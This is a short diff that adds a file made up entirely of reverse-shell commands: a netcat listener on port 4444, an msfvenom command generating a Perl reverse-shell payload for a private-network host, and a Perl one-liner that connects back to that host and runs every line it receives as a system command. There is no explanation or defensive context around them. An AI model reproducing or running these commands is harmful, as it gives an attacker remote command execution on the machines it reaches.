@@ -1,0 +1,18 @@
+
+
+nc -l -p 4444
+
+
+msfvenom.bat -p cmd/unix/reverse_perl LHOST=192.168.138.140
+
+perl -MIO -e '$p=fork;exit,if($p);foreach my $key(keys %ENV){if($ENV{$key}=~/(.*)/){$ENV{$key}=$1;}}$c=newIO::Socket::INET(PeerAddr,"192.168.138.140:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);while(<>){if($_=~ /(.*)/){system $1;}};'
+
+
+
+
+
+
+
+
+
+
